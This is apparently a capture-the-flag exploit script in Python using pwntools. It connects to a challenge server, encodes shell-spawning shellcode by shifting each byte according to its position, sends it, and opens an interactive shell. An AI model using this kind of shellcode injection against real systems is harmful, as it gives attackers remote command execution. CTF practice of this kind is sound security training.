from pwn import *
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
p = remote('challenge.ctf.games', 32383)

shellcode = asm(shellcraft.sh())
payload = []
s = lambda n: n%2
for i in range(len(shellcode)):
    offset = i*(-1) if i%2 == 1 else i
    print(shellcode[i] - offset)
    res = shellcode[i] - offset
    if res > 255:
        res = res - 256
    if res < 0:
        res = res + 256
    payload.append(res)

p.recvuntil(b'Enter your shellcode.\n')
p.sendline(bytes(payload))
p.interactive()
    